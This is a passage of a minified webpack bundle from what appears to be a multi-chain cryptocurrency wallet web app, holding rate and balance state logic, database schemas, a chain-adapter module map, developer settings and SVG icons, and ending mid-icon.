            const i = null !== (a = null === (n = e.wallets) || void 0 === n ? void 0 : n[l]) && void 0 !== a ? a : {
                balance: {
                    ...p
                },
                transactions: {
                    ...f
                }
            }
              , o = Date.now();
            i.transactions.apiStatus = s;
            i.transactions.updateTime = o;
            s === r.Resolved && (i.transactions.successTime = o);
            return {
                ...e,
                wallets: {
                    ...e.wallets,
                    [l]: i
                }
            }
        }
        )).handleAction(d.clear, ( () => ({
            ...m
        })))
          , h = {
            storeKey: l,
            whitelist: s,
            reducer: E
        };
        var g = a(22222);
        const selectUpdateStatuses = e => e[l]
          , y = (0,
        g.P1)(selectUpdateStatuses, (e => e.wallets || {}))
          , v = (0,
        g.P1)(selectUpdateStatuses, (e => e.globalWalletsBalance))
    }
    ,
    14456: (e, t, a) => {
        "use strict";
        a.d(t, {
            f5: () => _e,
            jl: () => ke,
            xs: () => Ne,
            Y2: () => Te,
            Dn: () => Ae
        });
        var n = a(88921)
          , r = a.n(n)
          , l = a(96248)
          , s = a.n(l)
          , i = a(13599)
          , o = a.n(i)
          , c = a(11477)
          , u = a.n(c)
          , d = a(64362)
          , m = a.n(d)
          , p = a(15389)
          , f = a.n(p)
          , E = a(90401)
          , h = a.n(E)
          , g = a(45164)
          , y = a.n(g)
          , v = a(91238)
          , _ = a.n(v)
          , w = a(54837)
          , b = a.n(w)
          , k = a(87485)
          , S = a.n(k)
          , C = a(56767)
          , N = a.n(C)
          , T = a(76651)
          , A = a.n(T)
          , x = a(61437)
          , I = a.n(x)
          , P = a(35285)
          , L = a.n(P)
          , F = a(39865)
          , W = a.n(F)
          , R = a(86535)
          , B = a.n(R)
          , O = a(99244)
          , D = a.n(O)
          , M = a(74326)
          , U = a.n(M)
          , G = a(2490)
          , V = a.n(G)
          , K = a(82499)
          , H = a.n(K)
          , z = a(57640)
          , j = a.n(z)
          , $ = a(9924)
          , Z = a.n($)
          , Y = a(88449)
          , q = a.n(Y)
          , X = a(59849)
          , Q = a.n(X)
          , J = a(64211)
          , ee = a.n(J)
          , te = a(41874)
          , ae = a.n(te)
          , ne = a(22222)
          , re = a(68981)
          , le = a(21031)
          , se = a(43090)
          , ie = a(79724)
          , oe = a(62035)
          , ce = a(57343)
          , ue = a(67728)
          , de = a(6391);
        const me = "rates2"
          , unique = e => [...new Set(e)]
          , selectRates = e => e.rates2 || {}
          , pe = (0,
        ne.P1)(selectRates, (e => e.wantedCoins))
          , fe = (0,
        ne.P1)(selectRates, (e => e.wantedTokens))
          , Ee = (0,
        ne.P1)(selectRates, (e => e.wantedTokenExtraIdentifiers))
          , he = (0,
        ne.P1)(selectRates, (e => e.wantedFiats))
          , ge = (0,
        ne.P1)(de.zZ, (function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : [];
            return e.flatMap((e => e.subWallets))
        }
        ))
          , ye = (0,
        ne.P1)(pe, (function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            return Object.entries(e).filter((e => {
                let[,t] = e;
                return t > 0
            }
            )).map((e => {
                let[t] = e;
                return t
            }
            ))
        }
        ))
          , ve = (0,
        ne.P1)(de.zZ, (function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : [];
            return unique(e.map((e => e.currency)))
        }
        ))
          , _e = (0,
        ne.P1)([ye, ve], ( (e, t) => unique([...e, ...t])))
          , we = (0,
        ne.P1)([fe, Ee], (function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}
              , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            e = (0,
            ie.Z)((e => Object.values(e).some((e => e > 0))), e);
            return (0,
            le.Z)(( (e, a) => Object.entries(t[a] || {}).filter((e => {
                let[,t] = e;
                return t > 0
            }
            )).map((e => {
                let[t] = e;
                return t
            }
            ))), e)
        }
        ))
          , be = (0,
        ne.P1)(ge, (e => {
            const t = (0,
            oe.Z)((e => {
                var t;
                return null !== (t = e.family) && void 0 !== t ? t : "undefined"
            }
            ), e)
              , a = undefined;
            return (0,
            re.Z)((e => {
                const t = e.map(ce.B);
                return unique(t).filter((e => Boolean(e)))
            }
            ), t)
        }
        ))
          , ke = (0,
        ne.P1)([we, be], ( (e, t) => (0,
        se.Z)(( (e, t) => unique([...e, ...t])), e, t)))
          , Se = ["usd", "eur"]
          , Ce = (0,
        ne.P1)(he, (function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            return unique([...Se, ...Object.entries(e).filter((e => {
                let[,t] = e;
                return t > 0
            }
            )).map((e => {
                let[t] = e;
                return t
            }
            ))])
        }
        ))
          , Ne = (0,
        ne.P1)([Ce, ue.selectedLocalCurrency], ( (e, t) => unique([t, ...e])))
          , Te = (0,
        ne.P1)(selectRates, (e => {
            let {rates: t={}} = e;
            return t
        }
        ))
          , Ae = (0,
        ne.P1)(selectRates, (e => e.usdRates))
    }
    ,
    11228: (e, t, a) => {
        "use strict";
        a.d(t, {
            Zk: () => wantFiats,
            Dw: () => unwantFiats,
            Wq: () => wantWallet,
            kc: () => unwantWallet,
            o$: () => updateCoins,
            CA: () => updateUsdRates,
            $j: () => updateTokens
        });
        var n = a(38559)
          , r = a.n(n)
          , l = a(57640)
          , s = a.n(l)
          , i = a(9924)
          , o = a.n(i)
          , c = a(31672)
          , u = a.n(c)
          , d = a(2490)
          , m = a.n(d)
          , p = a(59461)
          , f = a.n(p)
          , E = a(85827)
          , h = a.n(E)
          , g = a(25387)
          , y = a.n(g)
          , v = a(72608)
          , _ = a.n(v)
          , w = a(38862)
          , b = a.n(w)
          , k = a(10956)
          , S = a.n(k)
          , C = a(68981)
          , N = a(62035)
          , T = a(89020)
          , A = a(20024)
          , x = a.n(A)
          , I = a(55207)
          , P = a(67894)
          , L = a(32790)
          , F = a(57343)
          , W = a(41143)
          , R = a.n(W);
        const B = ["etharb", "ethop"]
          , O = x()((e => {
            let[t,a] = e;
            t((0,
            L.hd)(a))
        }
        ), {
            threshold: 300,
            createInitialBatch: () => [ () => {}
            , {
                wantedFiats: {},
                wantedTokenExtraIdentifiers: {}
            }],
            addArgumentsToBatch: (e, t) => {
                const [,a] = e
                  , [n,r] = t;
                return [n, {
                    wantedFiats: (0,
                    P.mergeWithSum)(a.wantedFiats, r.wantedFiats)
                }]
            }
        })
          , wantFiats = e => {
            let {fiats: t} = e;
            return e => {
                O(e, {
                    wantedFiats: Object.fromEntries(t.map((e => [e, 1])))
                })
            }
        }
          , unwantFiats = e => {
            let {fiats: t} = e;
            return e => {
                O(e, {
                    wantedFiats: Object.fromEntries(t.map((e => [e, -1])))
                })
            }
        }
          , D = x()((e => {
            let[t,a] = e;
            t((0,
            L.Cl)(a))
        }
        ), {
            threshold: 300,
            createInitialBatch: () => [ () => {}
            , {
                wantedCoins: {},
                wantedTokenExtraIdentifiers: {}
            }],
            addArgumentsToBatch: (e, t) => {
                const [,a] = e
                  , [n,r] = t;
                return [n, {
                    wantedCoins: (0,
                    P.mergeWithSum)(a.wantedCoins, r.wantedCoins)
                }]
            }
        })
          , M = x()((e => {
            let[t,a] = e;
            t((0,
            L.vd)(a))
        }
        ), {
            threshold: 300,
            createInitialBatch: () => [ () => {}
            , {
                wantedTokens: {},
                wantedTokenExtraIdentifiers: {}
            }],
            addArgumentsToBatch: (e, t) => {
                const [,a] = e
                  , [n,r] = t;
                return [n, {
                    wantedTokens: (0,
                    P.reduceMerge)(a.wantedTokens, r.wantedTokens),
                    wantedTokenExtraIdentifiers: (0,
                    P.reduceMerge)(a.wantedTokenExtraIdentifiers, r.wantedTokenExtraIdentifiers)
                }]
            }
        })
          , wantWallet = e => t => {
            var a;
            const n = null !== (a = null == e ? void 0 : e.data) && void 0 !== a ? a : e;
            if (e.isSubWallet) {
                R()(null == n ? void 0 : n.family, "subwallets must have `family`");
                const e = (0,
                F.B)(n);
                return M(t, {
                    wantedTokens: {
                        [n.family]: {
                            [n.currency]: 1
                        }
                    },
                    wantedTokenExtraIdentifiers: e ? {
                        [n.family]: {
                            [e]: 1
                        }
                    } : {}
                })
            }
            return D(t, {
                wantedCoins: {
                    [e.currency]: 1
                }
            })
        }
          , unwantWallet = e => t => {
            var a;
            const n = null !== (a = null == e ? void 0 : e.data) && void 0 !== a ? a : e;
            if (e.isSubWallet) {
                R()(n.family, "subwallets must have `family`");
                const e = (0,
                F.B)(n);
                return M(t, {
                    wantedTokens: {
                        [n.family]: {
                            [n.currency]: -1
                        }
                    },
                    wantedTokenExtraIdentifiers: e ? {
                        [n.family]: {
                            [e]: -1
                        }
                    } : {}
                })
            }
            return D(t, {
                wantedCoins: {
                    [n.currency]: -1
                }
            })
        }
          , groupRatesByFamily = e => (0,
        C.Z)((0,
        N.Z)((e => e.currency)), (0,
        N.Z)((e => e.family), e))
          , patchCoins = e => {
            const t = e.find((e => "eth" === e.id));
            return t ? [...e, ...B.map((e => ({
                ...t,
                currency: e,
                family: e,
                id: e
            })))] : e
        }
          , U = S()((async e => {
            const {data: {response: t}} = await I.w.get("/rates/coins", {
                params: {
                    fiats: e.join()
                }
            });
            return groupRatesByFamily(patchCoins(t))
        }
        ), {
            cacheKey: e => {
                let[t] = e;
                return t.join()
            }
            ,
            maxAge: 3e4
        })
          , G = S()((async () => {
            const {data: {response: e}} = await I.w.get("/rates/fiats");
            return e
        }
        ))
          , updateCoins = (e, t) => async e => {
            const a = await U(t);
            e((0,
            L.pY)({
                rates: a
            }))
        }
          , updateUsdRates = () => async e => {
            const t = await G();
            e((0,
            L.pm)({
                usdRates: t
            }))
        }
          , V = S()((async (e, t, a) => {
            const {data: {response: n}} = await I.w.post(`/rates/tokens/${encodeURIComponent(e)}`, {
                fiats: a.join(),
                extraIdentifiers: t
            });
            return groupRatesByFamily(n)
        }
        ), {
            cacheKey: e => {
                let[t,a,n] = e;
                return [t, ...a, ...n].join()
            }
            ,
            maxAge: 3e4
        })
          , K = S()((async (e, t) => {
            const a = undefined;
            return (await Promise.all(e.map((e => {
                let {family: a, extraIdentifiers: n} = e;
                return V(a, n, t)
            }
            )))).reduce(( (e, t) => (0,
            T.Z)(P.concatRatesDTOsById, e, t)), {})
        }
        ), {
            cacheKey: e => {
                let[t,a] = e;
                return [JSON.stringify(t), ...a].join()
            }
            ,
            maxAge: 3e4
        })
          , updateTokens = (e, t) => async a => {
            const n = await K(e, t);
            a((0,
            L.pY)({
                rates: n
            }))
        }
    }
    ,
    68841: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => n
        });
        const n = {
            version: 10,
            keyCompression: !0,
            type: "object",
            properties: {
                key: {
                    type: "string",
                    primary: !0
                },
                value: {
                    type: "string"
                }
            },
            required: ["key", "value"]
        }
    }
    ,
    84234: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => n
        });
        const n = {
            version: 19,
            keyCompression: !0,
            type: "object",
            additionalProperties: !1,
            properties: {
                primaryKey: {
                    type: "string",
                    primary: !0
                },
                addressFrom: {
                    type: ["null", "string"]
                },
                addressTo: {
                    type: ["null", "string"]
                },
                currencyFrom: {
                    type: "string"
                },
                currencyTo: {
                    type: "string"
                },
                isIncoming: {
                    type: "boolean"
                },
                isToken: {
                    type: "boolean"
                },
                confirmations: {
                    type: ["number", "string"]
                },
                height: {
                    type: ["number", "string"]
                },
                memo: {
                    type: ["string", "null"]
                },
                family: {
                    type: "string"
                },
                timestamp: {
                    type: "number"
                },
                amount: {
                    type: ["number", "string"]
                },
                hash: {
                    type: ["string", "null"]
                },
                nonce: {
                    type: ["string", "number"]
                },
                fee: {
                    type: ["number", "string"]
                },
                contractData: {},
                contractType: {
                    type: ["string", "number"]
                },
                isError: {
                    type: "boolean"
                },
                isPending: {
                    type: "boolean"
                },
                extra: {},
                additionalSent: {
                    type: "string"
                },
                uniqKey: {
                    type: "string"
                },
                type: {
                    type: "string"
                },
                original: {},
                minConfirmations: {
                    type: "number"
                },
                blockhash: {
                    type: "string"
                },
                status: {
                    type: "string"
                },
                attachment: {
                    type: "string"
                },
                multisigId: {
                    type: "string"
                },
                walletType: {
                    type: "string"
                },
                currency: {
                    type: "string"
                },
                minimumSigAmount: {
                    type: "number"
                },
                walletAddressData: {
                    type: "string"
                },
                createdAt: {
                    type: "string"
                },
                transactions: {
                    type: "array",
                    items: {
                        type: "string"
                    }
                },
                participants: {
                    type: "array",
                    items: {}
                },
                uuid: {
                    type: "string"
                },
                address: {
                    type: "string"
                },
                balance: {
                    type: "string"
                },
                title: {
                    type: "string"
                },
                txCreatedAt: {
                    type: "string"
                },
                transactionId: {
                    type: "string"
                },
                currencyTx: {
                    type: "string"
                },
                currencyMultisig: {
                    type: "string"
                },
                destination: {
                    type: "string"
                },
                states: {
                    type: "array",
                    items: {}
                },
                transactionHash: {
                    type: "string"
                },
                amountFrom: {
                    type: ["number", "string"]
                },
                amountTo: {
                    type: ["number", "string"]
                },
                paymentId: {
                    type: "string"
                },
                familyMultisig: {
                    type: "string"
                },
                exchangeId: {
                    type: "string"
                },
                partnerId: {
                    type: "string"
                },
                vin: {
                    type: ["any"]
                },
                vout: {
                    type: ["any"]
                },
                sourceWalletId: {
                    type: "string"
                },
                expectedAmountFrom: {
                    type: "string"
                },
                expectedAmountTo: {
                    type: "string"
                },
                bandwidthFee: {
                    type: ["number", "string"]
                },
                energyFee: {
                    type: ["number", "string"]
                },
                netFee: {
                    type: ["number", "string"]
                },
                energyUsage: {
                    type: ["number", "string"]
                },
                precision: {
                    type: ["number", "string"]
                }
            },
            required: ["primaryKey", "timestamp"]
        }
    }
    ,
    67144: e => {
        e.exports = {
            colorTextPrimary: "#455a64",
            colorGray: "#aaa9a9",
            colorBlue: "#448aff",
            colorBluePrimary: "#7190EB",
            colorRed: "#E53935",
            colorGreen: "#50E3C2",
            colorDarkGreen: "#70a800",
            colorBackground: "#f1f2fa",
            colorDarkBackground: "#222223",
            colorDarkBlocks: "#303132",
            colorOrange: "#f39c12",
            colorLightGreen: "#55b64e",
            colorLightGray: "#dadada",
            colorDarkGray: "#44444f",
            colorWhiteGray: "#e4e4e4"
        }
    }
    ,
    18913: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => __WEBPACK_DEFAULT_EXPORT__
        });
        const n = /[&<>"'/*]/g
          , r = {
            "&": "",
            "<": "",
            ">": "",
            '"': "",
            "'": "",
            "/": "",
            "*": "",
            ":": ":"
        }
          , __WEBPACK_DEFAULT_EXPORT__ = e => `${e}`.replace(n, (e => r[e]))
    }
    ,
    59351: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => __WEBPACK_DEFAULT_EXPORT__
        });
        var n = a(38862)
          , r = a.n(n)
          , l = a(86575);
        const s = undefined
          , __WEBPACK_DEFAULT_EXPORT__ = async (e, t) => {
            let a = t;
            a instanceof Error && (a = JSON.parse(JSON.stringify(a, Object.getOwnPropertyNames(a))));
            await l.nW.post("/api/v1/internal/exchanges/error", {
                id: e,
                error: a
            })
        }
    }
    ,
    57506: (e, t, a) => {
        "use strict";
        a.d(t, {
            NI: () => n,
            ZP: () => setOrGetActiveLsParam,
            Pt: () => getParamsStatus
        });
        const n = ["developer-mode-active", "api-root-url", "api-timeout", "hovard-root-url", "robert-root-url", "log-enabled", "fletcher-root-url", "token-creator-engine-url", "balance", "remove-rxdb", "use-localstorage", "break-persistance", "disable-background-wallet-updater", "epilepsy-mode", "feature-mnemonic"];
        function setOrGetActiveLsParam(e) {
            try {
                var t;
                const {searchParams: a} = new URL(document.location.href)
                  , n = `dangerously-${e}`
                  , r = a.get(n)
                  , l = a.has(n)
                  , s = undefined;
                "0" === r ? localStorage.removeItem(`param:${e}`) : l && localStorage.setItem(`param:${e}`, null != r ? r : "");
                return null !== (t = localStorage.getItem(`param:${e}`)) && void 0 !== t ? t : void 0
            } catch (e) {
                console.error(e)
            }
        }
        function getParamsStatus(e) {
            var t;
            return null !== (t = localStorage.getItem(`param:${e}`)) && void 0 !== t ? t : void 0
        }
    }
    ,
    57343: (e, t, a) => {
        "use strict";
        a.d(t, {
            B: () => extraIdentifierFromSubWallet
        });
        const extraIdentifierFromSubWallet = e => e.smartContract ? e.smartContract : e.currency.indexOf("-") > -1 ? e.currency : void 0
    }
    ,
    87205: (e, t, a) => {
        "use strict";
        a.d(t, {
            t: () => toLower
        });
        function toLower(e) {
            return String(e || "").toLowerCase()
        }
    }
    ,
    42155: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => __WEBPACK_DEFAULT_EXPORT__
        });
        const s4 = () => Math.floor(65536 * (1 + Math.random())).toString(16).substring(1)
          , __WEBPACK_DEFAULT_EXPORT__ = () => `${s4() + s4()}-${s4()}-${s4()}-${s4()}-${s4()}${s4()}${s4()}`
    }
    ,
    99954: (e, t, a) => {
        "use strict";
        a.d(t, {
            e1: () => isWalletPrivateKeyObject,
            zv: () => isWalletPrivateKeyMnemonicObject,
            dh: () => isWalletPrivateKeyXmrObject,
            T9: () => getWalletPrivateKeyString
        });
        function isWalletPrivateKeyObject(e) {
            return Boolean(e && "object" == typeof e && "privateKey"in e)
        }
        function isWalletPrivateKeyMnemonicObject(e) {
            return Boolean(e && "object" == typeof e && "mnemonic"in e)
        }
        function isWalletPrivateKeyXmrObject(e) {
            return Boolean(e && "object" == typeof e && "viewKey"in e && "spendKey"in e)
        }
        function getWalletPrivateKeyString(e) {
            return "string" == typeof e ? e : isWalletPrivateKeyObject(e) ? e.privateKey : void 0
        }
    }
    ,
    47714: (e, t, a) => {
        var n = {
            "./adapters-light/index.js": [51231],
            "./adapters/ada-shelley/index.js": [14315, 4919],
            "./adapters/ada-shelley/tokens.js": [36158, 5385],
            "./adapters/ada/index.js": [98131, 9477],
            "./adapters/algo/index.js": [70048, 3364],
            "./adapters/algo/tokens.js": [52169, 1973],
            "./adapters/apt/index.js": [33112, 2953],
            "./adapters/atom/index.js": [67210, 3573],
            "./adapters/avax/index.js": [64722, 2826],
            "./adapters/avax/tokens.js": [62936, 3220],
            "./adapters/aya/index.js": [93928, 9492],
            "./adapters/bch/index.js": [2161, 639],
            "./adapters/bera/index.js": [86412, 4915],
            "./adapters/bera/tokens.js": [1904, 4983],
            "./adapters/bnb/index.js": [37428, 4458],
            "./adapters/bnb/tokens.js": [88885, 2205],
            "./adapters/bone/index.js": [77141, 2154],
            "./adapters/bone/tokens.js": [2343, 3361],
            "./adapters/bsc/index.js": [90637, 3023],
            "./adapters/bsc/tokens.js": [56940, 4027],
            "./adapters/bsv/index.js": [22182, 8460],
            "./adapters/btc-testnet/index.js": [58714, 4422],
            "./adapters/btc/index.js": [35902, 2064],
            "./adapters/btc/tokens.js": [39053, 9454],
            "./adapters/btcv/index.js": [21874, 1641],
            "./adapters/btg/index.js": [58568, 5830],
            "./adapters/bth/index.js": [83927, 1121],
            "./adapters/clo/index.js": [23714, 6170],
            "./adapters/coreum/index.js": [34792, 9813],
            "./adapters/crm/index.js": [99005, 2667],
            "./adapters/crux/index.js": [97593, 2768],
            "./adapters/dash/index.js": [84806, 3826],
            "./adapters/dcr/index.js": [57270, 5738],
            "./adapters/dgb/index.js": [78842, 604],
            "./adapters/doge/index.js": [29637, 3973],
            "./adapters/dot/index.js": [22346, 4327],
            "./adapters/egld/index.js": [3066, 8059],
            "./adapters/ela/index.js": [15079, 1006],
            "./adapters/eos/index.js": [72323, 83],
            "./adapters/eos/tokens.js": [66606, 8637],
            "./adapters/etc/index.js": [1232, 4842],
            "./adapters/etc/tokens.js": [83552, 3991],
            "./adapters/eth/erc20.js": [54925, 1819],
            "./adapters/eth/erc721.js": [27521, 9685],
            "./adapters/eth/index.js": [86448, 8017],
            "./adapters/etharb/index.js": [25624, 8060],
            "./adapters/etharb/tokens.js": [45351, 6304],
            "./adapters/ethop/index.js": [39096, 2762],
            "./adapters/ethop/tokens.js": [80754, 8278],
            "./adapters/ethw/erc20.js": [98509, 8266],
            "./adapters/ethw/erc721.js": [67583, 8438],
            "./adapters/ethw/index.js": [31561, 9467],
            "./adapters/exp/index.js": [83040, 626],
            "./adapters/fio/index.js": [46303, 938],
            "./adapters/firo/index.js": [47389, 6010],
            "./adapters/goerli/erc20.js": [98467, 7786],
            "./adapters/goerli/erc721.js": [24126, 915],
            "./adapters/goerli/index.js": [3841, 6935],
            "./adapters/grs/index.js": [15220, 5562],
            "./adapters/hbar-testnet/index.js": [53024, 2151],
            "./adapters/hbar-testnet/tokens.js": [86019, 8456],
            "./adapters/hbar/index.js": [77281, 2801],
            "./adapters/hbar/tokens.js": [29925, 7283],
            "./adapters/inj/index.js": [80338, 1090],
            "./adapters/joys/index.js": [22280, 5236],
            "./adapters/kas/index.js": [9664, 2549],
            "./adapters/kin/index.js": [45644, 1979],
            "./adapters/kmd/index.js": [15837, 1172],
            "./adapters/ksm/index.js": [12332, 9132],
            "./adapters/lsk/index.js": [15921, 133],
            "./adapters/ltc/index.js": [31707, 7679],
            "./adapters/matic/index.js": [52306, 5655],
            "./adapters/matic/tokens.js": [67555, 1084],
            "./adapters/near/index.js": [33470, 1855],
            "./adapters/neo/index.js": [68079, 2312],
            "./adapters/neo/tokens.js": [5441, 9543],
            "./adapters/nlg/index.js": [18798, 9613],
            "./adapters/one/index.js": [88575, 4790],
            "./adapters/ont/index.js": [34765, 2504],
            "./adapters/ont/tokens.js": [95697, 1542],
            "./adapters/qtum/index.js": [41583, 8081],
            "./adapters/rdd/index.js": [20252, 7618],
            "./adapters/ropsten/index.js": [95009, 3502],
            "./adapters/ropsten/tokens.js": [91674, 5856],
            "./adapters/rvn/index.js": [61742, 5691],
            "./adapters/sol/index.js": [96201, 1154],
            "./adapters/sol/tokens.js": [61082, 8027],
            "./adapters/terra-luna/index.js": [84824, 5223],
            "./adapters/ton/index.js": [12962, 2670],
            "./adapters/ton/tokens.js": [61350, 7567],
            "./adapters/trx/index.js": [79978, 4680],
            "./adapters/trx/tokens.js": [92289, 9468],
            "./adapters/ubq/index.js": [43653, 1106],
            "./adapters/vet/index.js": [46912, 4795],
            "./adapters/vet/tokens.js": [44374, 5315],
            "./adapters/vtc/index.js": [84636, 3474],
            "./adapters/waves/index.js": [44048, 3703],
            "./adapters/waves/tokens.js": [36353, 8422],
            "./adapters/xdc/index.js": [9561, 3208],
            "./adapters/xdc/tokens.js": [86620, 628],
            "./adapters/xec/index.js": [11733, 6329],
            "./adapters/xem/index.js": [42414, 5965],
            "./adapters/xlm/index.js": [20411, 8787],
            "./adapters/xmr/index.js": [20376, 2959],
            "./adapters/xno/index.js": [59086, 811],
            "./adapters/xrp/index.js": [29079, 2892],
            "./adapters/xtz/index.js": [55389, 1761],
            "./adapters/xvg/index.js": [71287, 9590],
            "./adapters/yec/index.js": [44076, 1080],
            "./adapters/zec-testnet/index.js": [71437, 4473],
            "./adapters/zec/index.js": [96179, 8704],
            "./adapters/zen/index.js": [56098, 521],
            "./adapters/zil-testnet/index.js": [96359, 2016],
            "./adapters/zil/index.js": [43643, 2886],
            "./dependencies/base58check/index.js": [84856, 2657],
            "./dependencies/bip32-path/index.js": [62646, 12],
            "./dependencies/bip32/index.js": [10526, 808],
            "./dependencies/bitcoinjs-lib-latest/index.js": [75268, 5778],
            "./dependencies/bitcoinjs-lib/index.js": [53453, 8245],
            "./dependencies/bitcore-lib-cash/index.js": [13401, 1124],
            "./dependencies/bitcore-lib/index.js": [37509, 1669],
            "./dependencies/bitcore-mnemonic/index.js": [60437, 9228],
            "./dependencies/bitgo-utxo-lib/index.js": [81639, 2841],
            "./dependencies/bitgo-zec/index.js": [71498, 5784],
            "./dependencies/ethereumjs-tx/index.js": [28541, 4278],
            "./dependencies/ethereumjs-wallet-hdkey/index.js": [81067, 5170],
            "./dependencies/lucid-cardano/index.js": [60453, 7961],
            "./dependencies/lucid-cardano/node-provider/index.js": [8887, 2511],
            "./dependencies/web3/index.js": [68985, 7156],
            "./error-handler/codes.js": [91779],
            "./error-handler/index.js": [68605],
            "./index/index.js": [52434],
            "./validators/index.js": [74863]
        };
        function webpackAsyncContext(e) {
            if (!a.o(n, e))
                return Promise.resolve().then(( () => {
                    var t = new Error("Cannot find module '" + e + "'");
                    t.code = "MODULE_NOT_FOUND";
                    throw t
                }
                ));
            var t = n[e]
              , r = t[0];
            return Promise.all(t.slice(1).map(a.e)).then(( () => a.t(r, 23)))
        }
        webpackAsyncContext.keys = () => Object.keys(n);
        webpackAsyncContext.id = 47714;
        e.exports = webpackAsyncContext
    }
    ,
    83473: e => {
        e.exports = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 18 20"><path d="M16.86 7.154h-.487V4.836c0-.014-.002-.029-.004-.043a.381.381 0 0 0-.095-.254L12.355.134l-.003-.003a.385.385 0 0 0-.105-.08.42.42 0 0 0-.079-.033l-.021-.007A.407.407 0 0 0 12.055 0h-9.63a.792.792 0 0 0-.798.784v6.37H1.14C.51 7.154 0 7.655 0 8.274v5.83c0 .619.51 1.121 1.14 1.121h.487v3.99c0 .433.357.785.797.785h13.152c.44 0 .797-.352.797-.784v-3.99h.488A1.13 1.13 0 0 0 18 14.103v-5.83c0-.618-.51-1.12-1.14-1.12zM2.425.784h9.233v4.013c0 .217.178.392.398.392h3.52v1.965H2.426V.784zm6 10.64c-.989-.339-1.633-.877-1.633-1.729 0-1 .847-1.764 2.251-1.764.672 0 1.166.139 1.52.296l-.3 1.068a2.86 2.86 0 0 0-1.246-.278c-.583 0-.865.26-.865.565 0 .374.335.539 1.104.825 1.05.383 1.545.921 1.545 1.747 0 .981-.768 1.816-2.402 1.816-.68 0-1.351-.174-1.687-.357l.274-1.095c.362.183.918.365 1.493.365.618 0 .944-.251.944-.634 0-.365-.282-.574-.998-.825zm-7.011-.383c0-1.998 1.448-3.11 3.25-3.11.697 0 1.227.139 1.465.26l-.274 1.052a2.957 2.957 0 0 0-1.13-.217c-1.068 0-1.898.634-1.898 1.937 0 1.173.706 1.912 1.907 1.912a3.41 3.41 0 0 0 1.121-.192l.204 1.034c-.248.122-.804.253-1.528.253-2.057 0-3.117-1.26-3.117-2.929zm14.163 7.962H2.424v-3.778h13.152v3.778zm-.89-5.12h-1.572l-1.907-5.856h1.474l.724 2.476c.203.695.389 1.364.53 2.094h.027c.15-.704.335-1.4.538-2.068l.76-2.502h1.43l-2.005 5.856z"></path></svg>'
    }
    ,
    70476: e => {
        e.exports = '<svg viewBox="0 0 24 18" xmlns="http://www.w3.org/2000/svg"><path d="M11.571 4.286l-8.128 6.348a.173.173 0 0 1-.007.04.174.174 0 0 0-.007.04v6.428c0 .233.09.434.268.603.18.17.391.255.636.255h5.429v-5.143h3.619V18h5.428a.893.893 0 0 0 .636-.255c.18-.17.27-.37.27-.603v-6.428a.18.18 0 0 0-.015-.08l-8.129-6.348z"></path><path d="M22.983 9.223L19.84 6.537V.517a.466.466 0 0 0-.13-.34.44.44 0 0 0-.33-.133h-2.756a.441.441 0 0 0-.33.133.467.467 0 0 0-.129.34v2.877L12.663.384A1.646 1.646 0 0 0 11.572 0c-.421 0-.785.128-1.091.384L.16 9.223a.433.433 0 0 0-.158.317.487.487 0 0 0 .1.347l.89 1.092a.486.486 0 0 0 .301.162c.115.01.23-.024.345-.103l9.933-8.515 9.934 8.515a.435.435 0 0 0 .301.103h.044a.486.486 0 0 0 .301-.162l.89-1.092a.487.487 0 0 0 .1-.347.434.434 0 0 0-.158-.317z"></path></svg>'
    }
    ,
    88494: e => {
        e.exports = '<svg fill="C7C7C7" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 21 20"><path d="M13.74 9.6c-.463.632-.947.968-1.305 1.221-.4.274-.568.4-.61 1.053a.55.55 0 01-.548.505h-.863a.576.576 0 01-.568-.61c.126-1.516.715-2.064 1.452-2.569.295-.21.569-.4.842-.779a1.29 1.29 0 00.085-1.347c-.148-.316-.569-.821-1.537-.821-1.263 0-1.642.8-1.769 1.41a.545.545 0 01-.547.463h-.884c-.337 0-.61-.294-.548-.631.232-1.663 1.432-3.242 3.748-3.242 1.452 0 2.694.715 3.305 1.915.59 1.137.484 2.443-.253 3.432zm-2.905 6.126a1.2 1.2 0 11-.001-2.399 1.2 1.2 0 01.001 2.4zM10.667 0c-5.516 0-10 4.484-10 10s4.484 10 10 10c5.515 0 10-4.484 10-10s-4.485-10-10-10z"></path></svg>'
    }
    ,
    13858: e => {
        e.exports = '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M22.5 11.9997C22.5 14.7845 21.3938 17.4552 19.4246 19.4243C17.4555 21.3935 14.7848 22.4997 12 22.4997C9.21523 22.4997 6.54451 21.3935 4.57538 19.4243C2.60625 17.4552 1.5 14.7845 1.5 11.9997C1.5 11.8008 1.57902 11.61 1.71967 11.4694C1.86032 11.3287 2.05109 11.2497 2.25 11.2497C2.44891 11.2497 2.63968 11.3287 2.78033 11.4694C2.92098 11.61 3 11.8008 3 11.9997C2.99692 14.0082 3.66478 15.9603 4.8976 17.5459C6.13041 19.1316 7.85753 20.2601 9.80483 20.7523C11.7521 21.2444 13.808 21.0721 15.6462 20.2626C17.4844 19.4531 18.9995 18.0528 19.9511 16.284C20.9028 14.5152 21.2363 12.4793 20.8989 10.4993C20.5614 8.51929 19.5723 6.70874 18.0886 5.35499C16.6048 4.00124 14.7114 3.18187 12.7088 3.02692C10.7063 2.87198 8.70935 3.39033 7.035 4.49972H7.5C7.69891 4.49972 7.88968 4.57874 8.03033 4.71939C8.17098 4.86004 8.25 5.05081 8.25 5.24972C8.25 5.44863 8.17098 5.6394 8.03033 5.78005C7.88968 5.9207 7.69891 5.99972 7.5 5.99972H5.25C5.05109 5.99972 4.86032 5.9207 4.71967 5.78005C4.57902 5.6394 4.5 5.44863 4.5 5.24972V2.99972C4.5 2.80081 4.57902 2.61004 4.71967 2.46939C4.86032 2.32874 5.05109 2.24972 5.25 2.24972C5.44891 